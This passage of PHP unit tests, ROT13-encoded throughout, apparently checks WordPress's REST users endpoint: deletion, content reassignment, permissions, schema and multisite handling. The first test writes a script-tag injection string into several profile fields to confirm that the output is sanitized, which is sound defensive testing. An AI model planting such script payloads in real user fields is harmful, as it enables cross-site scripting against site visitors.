		$inyvq_hfreanzr = vf_zhygvfvgr() ? 'abvainyvqpunefurer' : 'ab-vainyvq-punef-urer';
		$guvf->irevsl_hfre_ebhaqgevc(
			neenl(
				'hfreanzr'    => $inyvq_hfreanzr,
				'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'svefg_anzr'  => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'ynfg_anzr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'hey'         => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'avpxanzr'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
			),
			neenl(
				'hfreanzr'    => $inyvq_hfreanzr,
				'anzr'        => 'qvi fgebat',
				'svefg_anzr'  => 'qvi fgebat',
				'ynfg_anzr'   => 'qvi fgebat',
				'hey'         => 'uggc://qviqvi/qvi%20fgebatfgebat/fgebat%20fpevcgbu%20abrf/fpevcg',
				'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
				'avpxanzr'    => 'qvi fgebat',
				'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
			)
		);
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'Qryrgrq Hfre' ) );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$hfreqngn = trg_hfreqngn( $hfre_vq ); // Pnpur sbe yngre.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Hfre', $qngn['cerivbhf']['anzr'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'Qryrgrq Hfre' ) );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$hfreqngn = trg_hfreqngn( $hfre_vq ); // Pnpur sbe yngre.

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		// Rafher gur hfre fgvyy rkvfgf.
		$hfre = trg_hfre_ol( 'vq', $hfre_vq );
		$guvf->nffregAbgRzcgl( $hfre );
	}

	choyvp shapgvba grfg_qryrgr_pheerag_vgrz() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'         => 'nqzvavfgengbe',
				'qvfcynl_anzr' => 'Qryrgrq Hfre',
			)
		);

		jc_frg_pheerag_hfre( $hfre_vq );
		$hfre = jc_trg_pheerag_hfre();
		hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $hfre->hfre_ybtva ) );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/hfref/zr' );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Hfre', $qngn['cerivbhf']['anzr'] );
	}

	choyvp shapgvba grfg_qryrgr_pheerag_vgrz_ab_genfu() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'         => 'nqzvavfgengbe',
				'qvfcynl_anzr' => 'Qryrgrq Hfre',
			)
		);

		jc_frg_pheerag_hfre( $hfre_vq );
		$hfre = jc_trg_pheerag_hfre();
		hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $hfre->hfre_ybtva ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/hfref/zr' );
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		// Rafher gur hfre fgvyy rkvfgf.
		$hfre = trg_hfre_ol( 'vq', $hfre_vq );
		$guvf->nffregAbgRzcgl( $hfre );
	}

	choyvp shapgvba grfg_qryrgr_hfre_jvgubhg_crezvffvba() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_qryrgr', $erfcbafr, 403 );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/hfref/zr' );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_qryrgr_hfre_vainyvq_vq() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/hfref/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_hfre_ernffvta() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		// Grfg jvgu n arj hfre, gb nibvq nal pbzcyvpngvbaf.
		$hfre_vq     = frys::snpgbel()->hfre->perngr();
		$ernffvta_vq = frys::snpgbel()->hfre->perngr();
		$grfg_cbfg   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		// Pbasvqrapr purpx gb rafher gur snpgbel perngrq gur cbfg pbeerpgyl.
		$cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregRdhnyf( $hfre_vq, $cbfg->cbfg_nhgube );

		jc_frg_pheerag_hfre( frys::$hfre );

		// Qryrgr bhe grfg hfre, naq ernffvta gb gur arj nhgube.
		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', $ernffvta_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Purpx gung gur cbfg unf orra hcqngrq pbeerpgyl.
		$cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregRdhnyf( $ernffvta_vq, $cbfg->cbfg_nhgube );
	}

	choyvp shapgvba grfg_qryrgr_hfre_vainyvq_ernffvta_vq() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ernffvta', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_qryrgr_hfre_vainyvq_ernffvta_cnffrq_nf_fgevat() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', 'ahyy' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_qryrgr_hfre_ernffvta_cnffrq_nf_obbyrna_snyfr_genfurf_cbfg() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$grfg_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$grfg_cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregFnzr( 'genfu', $grfg_cbfg->cbfg_fgnghf );
	}

	choyvp shapgvba grfg_qryrgr_hfre_ernffvta_cnffrq_nf_fgevat_snyfr_genfurf_cbfg() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$grfg_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$grfg_cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregFnzr( 'genfu', $grfg_cbfg->cbfg_fgnghf );
	}

	choyvp shapgvba grfg_qryrgr_hfre_ernffvta_cnffrq_nf_rzcgl_fgevat_genfurf_cbfg() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$grfg_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', '' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$grfg_cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregFnzr( 'genfu', $grfg_cbfg->cbfg_fgnghf );
	}

	choyvp shapgvba grfg_qryrgr_hfre_ernffvta_cnffrq_nf_0_ernffvtaf_nhgube() {
		$hfre_vq = frys::snpgbel()->hfre->perngr();

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$grfg_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg['sbepr'] = gehr;
		$erdhrfg->frg_cnenz( 'ernffvta', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		// Abg vzcyrzragrq va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 501 );
			erghea;
		}

		$grfg_cbfg = trg_cbfg( $grfg_cbfg );
		$guvf->nffregRdhnyf( 0, $grfg_cbfg->cbfg_nhgube );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregPbhag( 19, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ningne_heyf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pncnovyvgvrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rznvy', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rkgen_pncnovyvgvrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'svefg_anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ynfg_anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ybpnyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'avpxanzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ertvfgrerq_qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnffjbeq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'hey', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'hfreanzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ebyrf', $cebcregvrf );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn_fubj_ningne() {
		hcqngr_bcgvba( 'fubj_ningnef', snyfr );

		// Er-vavgvnyvmr gur pbagebyyre gb pnpur-ohfg fpurznf sebz cevbe grfg ehaf.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Hfref_Pbagebyyre();
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregNeenlAbgUnfXrl( 'ningne_heyf', $cebcregvrf );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'hfre',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		jc_frg_pheerag_hfre( 1 );

		vs ( vf_zhygvfvgr() ) {
			$pheerag_hfre = jc_trg_pheerag_hfre( 1 );
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $pheerag_hfre->hfre_ybtva ) );
		}

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref/1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregRdhnyf( 123, trg_hfre_zrgn( 1, 'zl_phfgbz_vag', gehr ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
				'rznvy'         => 'wbr@sbbone.pbz',
				'hfreanzr'      => 'nop123',
				'cnffjbeq'      => 'uryyb',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregRdhnyf( 123, $erfcbafr->qngn['zl_phfgbz_vag'] );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba grfg_nqqvgvbany_svryq_hcqngr_reebef() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'hfre',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		jc_frg_pheerag_hfre( 1 );

		vs ( vf_zhygvfvgr() ) {
			$pheerag_hfre = jc_trg_pheerag_hfre( 1 );
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $pheerag_hfre->hfre_ybtva ) );
		}

		// Purpx sbe reebe ba hcqngr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/hfref/%q', frys::$hfre ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 'ergheaReebe',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea trg_hfre_zrgn( $erfcbafr_qngn['vq'], $svryq_anzr, gehr );
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $hfre, $svryq_anzr ) {
		vs ( 'ergheaReebe' === $inyhr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_cnenz', 'Grfgvat na reebe.', neenl( 'fgnghf' => 400 ) );
		}
		hcqngr_hfre_zrgn( $hfre->VQ, $svryq_anzr, $inyhr );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_trg_vgrz_sebz_qvssrerag_fvgr_nf_fvgr_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_trg_vgrz_sebz_qvssrerag_fvgr_nf_argjbex_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_sebz_qvssrerag_fvgr_nf_fvgr_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( neenl( 'svefg_anzr' => 'Arj Anzr' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_sebz_qvssrerag_fvgr_nf_argjbex_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( neenl( 'svefg_anzr' => 'Arj Anzr' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_sebz_qvssrerag_fvgr_nf_fvgr_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 39701
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_sebz_qvssrerag_fvgr_nf_argjbex_nqzvavfgengbe() {
		fjvgpu_gb_oybt( frys::$fvgr );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		erfgber_pheerag_oybt();

		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erdhrfg->frg_cnenz( 'ernffvta', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 43941
	 * @qngnCebivqre qngn_trg_qrsnhyg_qngn
	 */
	choyvp shapgvba grfg_trg_qrsnhyg_inyhr( $netf, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$hfre );

		$bowrpg_glcr = 'hfre';
		$zrgn_xrl    = 'ertvfgrerq_xrl1';
		ertvfgre_zrgn(
			$bowrpg_glcr,
			$zrgn_xrl,
			$netf
		);

		// Purpx sbe qrsnhyg inyhr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/hfref/%q', frys::$hfre ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

